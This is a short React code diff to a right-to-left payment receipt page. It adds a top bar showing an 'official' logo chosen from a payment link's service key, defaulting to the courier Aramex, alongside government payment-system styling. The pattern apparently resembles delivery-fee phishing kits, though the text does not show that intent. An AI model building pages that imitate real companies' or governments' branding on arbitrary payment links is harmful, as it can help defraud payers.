@@ -8,6 +8,8 @@ import { formatCurrency } from "@/lib/countryCurrencies";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getReceiptLayout } from "@/components/ReceiptLayouts";
 import { CheckCircle2, Download, Home, Share2 } from "lucide-react";
+import BrandedTopBar from "@/components/BrandedTopBar";
+import { getServiceBranding } from "@/lib/serviceLogos";
 
 const PaymentReceipt = () => {
   const { paymentId } = useParams();
@@ -33,7 +35,9 @@ const PaymentReceipt = () => {
   
   // Get service key for company-specific layout
   const serviceKey = link.payload?.service_key || 'aramex';
+  const serviceName = link.payload?.service_name || serviceKey;
   const ReceiptLayoutComponent = getReceiptLayout(serviceKey);
+  const branding = getServiceBranding(serviceKey);
   
   // Format payment data
   const formattedAmount = formatCurrency(payment.amount, link.country_code);
@@ -46,11 +50,19 @@ const PaymentReceipt = () => {
   });
   
   return (
-    <div 
-      className="min-h-screen py-12" 
-      dir="rtl"
-      style={{ background: govSystem.colors.surface }}
-    >
+    <>
+      {/* Branded Top Bar with Official Logo */}
+      <BrandedTopBar 
+        serviceKey={serviceKey}
+        serviceName={serviceName}
+        showBackButton={false}
+      />
+
+      <div 
+        className="min-h-screen py-6 sm:py-8" 
+        dir="rtl"
+        style={{ background: govSystem.colors.surface }}
+      >
       <div className="container mx-auto px-4">
         <div className="max-w-2xl mx-auto">
           {/* Success Animation */}
@@ -196,6 +208,7 @@ const PaymentReceipt = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
